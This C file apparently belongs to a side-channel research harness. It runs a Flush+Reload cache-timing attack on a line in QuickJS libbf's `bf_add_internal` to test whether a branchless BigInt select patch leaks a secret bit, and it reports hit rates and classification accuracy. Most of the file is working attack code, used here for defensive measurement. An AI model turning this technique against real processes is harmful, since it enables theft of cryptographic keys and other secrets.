/* Flush+Reload cache attack against the branchless `selectBigInt` patch.
 *
 * Targets a cache line inside QuickJS's libbf `bf_add_internal`, at the
 * source location (libbf.c ~949, the `bf_resize` call that begins the
 * full-arithmetic path) that is only reached when the BigInt operand `mask -
 * 1n + cond` has a nonzero-length second operand, i.e. only when the secret
 * bit `cond == 1`. `cond == 0` takes libbf's zero-operand shortcut and never
 * touches this line. See ../INTEL_PT_LOCALIZATION.md for how this address
 * was localized with Intel PT against a private debug build; the exact file
 * offset used here is re-derived from *this* build's libquickjs.so (see
 * get_bf_add_internal_target()) since compiler/build-flag differences shift
 * offsets between builds.
 *
 * Single-round proof of concept: each round pins the victim's `cond` bit via
 * the shared-memory env mechanism (same as openpgp_rsa.js's KEY_ID), runs a
 * tight flush/wait/reload loop concurrently with the victim's many identical
 * SELECT() calls, and reports the fraction of reloads that hit cache. If the
 * target line is a real signal, cond=1 rounds should show a starkly higher
 * hit rate than cond=0 rounds.
 */
#include "arch.h"
#include "cache.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "quickjs_runtime.h"
#include "quickjs/quickjs-libc.h"
#include "flush_reload.h"
#include "shared_memory.h"

#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <x86intrin.h>

enum { cache_line_count = 1, profile_iterations = 1 << 19 };
static uint64_t num_rounds = 200; /* alternates cond 0/1 */
static uint64_t victim_iters = 50; /* SELECT() calls per round; must match select_probe.js's default (env passthrough not wired, see FF_profile_select) */
/* One round's sampling budget. For single-call classification (victim_iters
 * small, e.g. 1) this only needs to cover module load + a handful of
 * SELECT() calls, not the old many-call-per-round proof of concept's ~300ms
 * window; override via ROUND_CYCLES. */
static uint64_t max_exec_cycles = (uint64_t)9e8;
static const char *test_name = "quickjs_select_fr";

/* Reload-latency cutoff (cycles) below which we call a probe a cache hit.
 * Matches the FR L3-ish cutoff evaluation/utils.py's lat_to_clevel() uses
 * (DRAM boundary at 460); kept tighter here since this is a quick in-process
 * summary, not the final scored signal. */
static const uint64_t hit_threshold = 300;

static uint64_t waiting_time = 2000;

static uint64_t reload_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *reload_time[cache_line_count];

uintptr_t target_bf_add;

/* File offset of the divergent instruction inside bf_add_internal (the
 * bf_resize call beginning the full-arithmetic path, libbf.c:~949), as found
 * via `nm`/`addr2line` against this project's build/quickjs/lib/quickjs/libquickjs.so.
 * Recompute if the QuickJS/libbf source or build flags change. */
static const uintptr_t bf_add_internal_full_path_file_offset = 0xb0065;

/* js_std_eval_file is an exported symbol we can take the address of
 * directly; its file offset (from `nm`) gives us the shared object's load
 * bias, from which we can reach the non-exported bf_add_internal. */
static const uintptr_t js_std_eval_file_offset = 0x18da0;

static void get_bf_add_internal_target() {
	uintptr_t load_bias =
	    (uintptr_t)&js_std_eval_file - js_std_eval_file_offset;
	target_bf_add =
	    (load_bias + bf_add_internal_full_path_file_offset) & CACHE_LINE_MASK;
	log_info("libquickjs.so load bias: %lx, target bf_add_internal "
	         "(full-path) cache line: %lx",
	         load_bias,
	         target_bf_add);
}

static uint64_t round_hits(int index) {
	uint64_t hits = 0;
	for (int j = 0; j < index; ++j) {
		if (reload_time_arr[0][j] > 0 && reload_time_arr[0][j] < hit_threshold) {
			++hits;
		}
	}
	return hits;
}

/* Baseline noise (unrelated system/measurement activity) produces a nonzero
 * hit rate even on cond=0 rounds, so "any hit at all" saturates to always-1.
 * Empirically, cond=1 rounds run the target's full-arithmetic path roughly
 * 2x more often than cond=0's residual noise rate, so a hit-COUNT threshold
 * (calibrated per victim_iters/ROUND_CYCLES combination) is the working
 * decision rule. */
static uint64_t hit_count_threshold = 60;

static int round_predict_cond1(uint64_t hits) {
	return hits > hit_count_threshold;
}

static void FF_profile_select() {
	sample_tsc[0] = sample_tsc_arr[0];
	reload_time[0] = reload_time_arr[0];

	init_sync_ctx(QUICKJS_PROJ_ID);
	pthread_barrier_wait(sync_ctx.barrier); /* matches victim's (A) */

	uint64_t cond0_hits = 0, cond0_total = 0, cond0_rounds = 0;
	uint64_t cond1_hits = 0, cond1_total = 0, cond1_rounds = 0;

	/* Single-shot classification confusion matrix. */
	uint64_t true_pos = 0, true_neg = 0, false_pos = 0, false_neg = 0;

	for (uint64_t i = 0; i < num_rounds; ++i) {
		/* quickjs_eval_buf_loop passes sync_ctx.data through a single
		 * putenv() call, so only one NAME=VALUE pair fits here; ITERS is
		 * a fixed default inside select_probe.js instead (see its own
		 * std.getenv('ITERS') fallback if that ever needs to vary). */
		int cond = (int)(i % 2);
		snprintf((char *)sync_ctx.data, sync_ctx_data_size, "COND=%d", cond);

		sync_ctx_set_action(SYNC_CTX_START);
		/* matches victim's (B) [i==0] or (D) [i>0] */
		pthread_barrier_wait(sync_ctx.barrier);

		int index = 0;
		uint64_t tsc0 = rdtscp();
		while (index < profile_iterations &&
		       rdtscp() - tsc0 < max_exec_cycles) {
			FLUSH_CACHE_LINE(bf_add, 0);
			FR_wait(waiting_time);
			RELOAD_CACHE_LINE(bf_add, 0, 0);
			++index;
		}

		if (sync_ctx_get_action() != SYNC_CTX_PAUSE) {
			log_warn("Round %lu: profiling time/iteration not enough "
			         "(index=%d)",
			         (unsigned long)i,
			         index);
		}
		/* matches victim's (C), releases it to (D) */
		pthread_barrier_wait(sync_ctx.barrier);

		uint64_t hits = round_hits(index);
		int predicted = round_predict_cond1(hits);
		log_info("Round %lu: cond=%d samples=%d hits=%lu (%.2f%%) predicted=%d",
		         (unsigned long)i,
		         cond,
		         index,
		         hits,
		         index > 0 ? 100.0 * hits / index : 0.0,
		         predicted);

		if (cond == 1 && predicted == 1) {
			++true_pos;
		} else if (cond == 0 && predicted == 0) {
			++true_neg;
		} else if (cond == 0 && predicted == 1) {
			++false_pos;
		} else {
			++false_neg;
		}

		if (cond == 0) {
			cond0_hits += hits;
			cond0_total += index;
			++cond0_rounds;
		} else {
			cond1_hits += hits;
			cond1_total += index;
			++cond1_rounds;
		}

		dump_profiling_traces(
		    test_name, num_rounds, sample_tsc, reload_time, cache_line_count,
		    index, i == 0);

		memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
		memset(reload_time_arr, 0, sizeof(reload_time_arr));
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);

	double cond0_rate = cond0_total > 0 ? 100.0 * cond0_hits / cond0_total : 0.0;
	double cond1_rate = cond1_total > 0 ? 100.0 * cond1_hits / cond1_total : 0.0;
	printf("\n== Summary: target=bf_add_internal full-path line (libbf.c "
	       "~949) ==\n");
	printf("cond=0 (shortcut expected):     %lu rounds, hit rate %.2f%%\n",
	       (unsigned long)cond0_rounds,
	       cond0_rate);
	printf("cond=1 (full arithmetic expected): %lu rounds, hit rate %.2f%%\n",
	       (unsigned long)cond1_rounds,
	       cond1_rate);
	printf("Delta (cond1 - cond0): %.2f percentage points\n",
	       cond1_rate - cond0_rate);

	uint64_t correct = true_pos + true_neg;
	uint64_t classified = true_pos + true_neg + false_pos + false_neg;
	printf("\n== Single-shot classification (any-hit-in-round rule) ==\n");
	printf("true_pos=%lu true_neg=%lu false_pos=%lu false_neg=%lu\n",
	       (unsigned long)true_pos,
	       (unsigned long)true_neg,
	       (unsigned long)false_pos,
	       (unsigned long)false_neg);
	printf("accuracy: %lu/%lu = %.2f%%\n",
	       (unsigned long)correct,
	       (unsigned long)classified,
	       classified > 0 ? 100.0 * correct / classified : 0.0);
}

int main(int argc, char **argv) {
	quickjs_get_bytecode_handler_cacheline();
	get_bf_add_internal_target();

	const char *env_rounds = getenv("NUM_ROUNDS");
	if (env_rounds != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_rounds, &endptr, 10);
		if (errno == 0 && endptr != env_rounds && *endptr == '\0') {
			num_rounds = value;
		}
	}

	const char *env_iters = getenv("VICTIM_ITERS");
	if (env_iters != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_iters, &endptr, 10);
		if (errno == 0 && endptr != env_iters && *endptr == '\0') {
			victim_iters = value;
		}
	}

	const char *env_round_cycles = getenv("ROUND_CYCLES");
	if (env_round_cycles != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_round_cycles, &endptr, 10);
		if (errno == 0 && endptr != env_round_cycles && *endptr == '\0') {
			max_exec_cycles = value;
		}
	}

	const char *env_hit_threshold = getenv("HIT_COUNT_THRESHOLD");
	if (env_hit_threshold != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_hit_threshold, &endptr, 10);
		if (errno == 0 && endptr != env_hit_threshold && *endptr == '\0') {
			hit_count_threshold = value;
		}
	}

	const char *env_waiting_time = getenv("WAITING_TIME");
	if (env_waiting_time != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_waiting_time, &endptr, 10);
		if (errno == 0 && endptr != env_waiting_time && *endptr == '\0') {
			waiting_time = value;
		}
	}

	if (argc > 1) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(argv[1], &endptr, 10);
		if (errno == 0 && endptr != argv[1] && *endptr == '\0' && value > 0) {
			num_rounds = value;
		} else {
			log_error("Invalid num_rounds argument '%s'", argv[1]);
			return -1;
		}
	}

	log_info("Config: num_rounds=%lu, victim_iters=%lu, waiting_time=%lu",
	         (unsigned long)num_rounds,
	         (unsigned long)victim_iters,
	         (unsigned long)waiting_time);

	FF_profile_select();
	return 0;
}
